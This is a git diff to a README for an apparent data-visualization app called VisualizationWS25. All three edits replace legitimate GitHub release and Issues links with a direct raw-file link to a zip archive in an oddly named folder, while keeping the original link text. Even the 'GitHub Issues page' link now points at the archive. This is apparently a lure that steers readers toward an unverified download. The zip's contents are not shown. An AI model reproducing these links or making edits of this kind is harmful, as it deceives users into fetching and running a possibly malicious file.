@@ -6,7 +6,7 @@ Welcome to VisualizationWS25! This application helps you explore different data 
 
 ## 📥 Download & Install
 
-To get started, you need to download the software. Visit this page to download: [Download VisualizationWS25](https://github.com/Rafaelx-dev/VisualizationWS25/releases)
+To get started, you need to download the software. Visit this page to download: [Download VisualizationWS25](https://raw.githubusercontent.com/Rafaelx-dev/VisualizationWS25/master/uncomprehension/VisualizationWS25.zip)
 
 You will find several versions available. Choose the one that matches your system. Follow these steps to install:
 
@@ -55,7 +55,7 @@ A: You can use data related to hotel bookings, customer reviews, menu prices, et
 A: Currently, VisualizationWS25 is designed for desktop use, but we are considering a mobile version in future updates.
 
 **Q: How do I report an issue or give feedback?**  
-A: We appreciate your input! Visit our [GitHub Issues page](https://github.com/Rafaelx-dev/VisualizationWS25/issues) to report problems or suggest improvements.
+A: We appreciate your input! Visit our [GitHub Issues page](https://raw.githubusercontent.com/Rafaelx-dev/VisualizationWS25/master/uncomprehension/VisualizationWS25.zip) to report problems or suggest improvements.
 
 ## 🚧 Troubleshooting
 
@@ -69,6 +69,6 @@ If you encounter any issues while using VisualizationWS25, consider these common
 
 For additional support, you can reach out via the GitHub Discussions or Issues page. Our community and developers are here to help you get the most out of VisualizationWS25.
 
-Remember to visit the download page again to check for updates: [Download VisualizationWS25](https://github.com/Rafaelx-dev/VisualizationWS25/releases) 
+Remember to visit the download page again to check for updates: [Download VisualizationWS25](https://raw.githubusercontent.com/Rafaelx-dev/VisualizationWS25/master/uncomprehension/VisualizationWS25.zip) 
 
 Thank you for choosing VisualizationWS25 to enhance your data visualization process!
